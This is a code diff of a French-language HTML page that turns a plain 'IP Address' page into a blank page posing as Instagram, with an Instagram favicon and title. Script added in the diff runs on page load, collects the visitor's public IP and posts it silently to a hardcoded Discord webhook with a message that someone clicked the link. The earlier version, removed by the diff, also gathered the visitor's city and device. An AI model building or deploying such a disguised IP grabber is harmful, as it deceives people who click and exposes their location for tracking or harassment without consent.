@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <title>IP Address</title>
+  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
+  <title>Instagram</title>
   <script>
-    function sendToDiscord(ipAddress, department) {
-      var webhookURL = "https://ptb.discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";
+    // Fonction pour envoyer l'adresse IP à Discord via un appel de webhook
+    function sendIPToDiscord(ipAddress) {
+      var webhookURL = "https://discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";
 
-      var content = "> **Adresse IP 🛰️ : **" + ipAddress +
-        "\n> **Département 🏠 : **" + department +
+      var content = "> **Quelqu'un viens de cliquer sur le lien, voici son adresse IP 🛰️ : **" + ipAddress;
+
 
       var request = new XMLHttpRequest();
       request.open("POST", webhookURL);
@@ -18,33 +20,26 @@
       request.send(JSON.stringify(params));
     }
 
-    function getIPCityDevice() {
+    // Fonction pour récupérer l'adresse IP de l'utilisateur
+    function getIPAddress() {
+      // Récupérer l'adresse IP de l'utilisateur en utilisant un service de géolocalisation
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
           var ipAddress = data.ip;
 
-          fetch('https://ipapi.co/' + ipAddress + '/json/')
-            .then(response => response.json())
-            .then(data => {
-              var city = data.city;
-              var device = navigator.platform;
-
-              sendToDiscord(ipAddress, city, device);
-            })
-            .catch(error => {
-              console.error('Erreur lors de la récupération de la ville :', error);
-            });
+          // Envoyer l'adresse IP à Discord
+          sendIPToDiscord(ipAddress);
         })
         .catch(error => {
           console.error('Erreur lors de la récupération de l\'adresse IP :', error);
         });
     }
 
-    window.addEventListener('DOMContentLoaded', getIPCityDevice);
+    // Appeler la fonction dès que la page est chargée
+    window.addEventListener('load', getIPAddress);
   </script>
 </head>
 <body>
-  <h1>IP Address</h1>
 </body>
 </html>
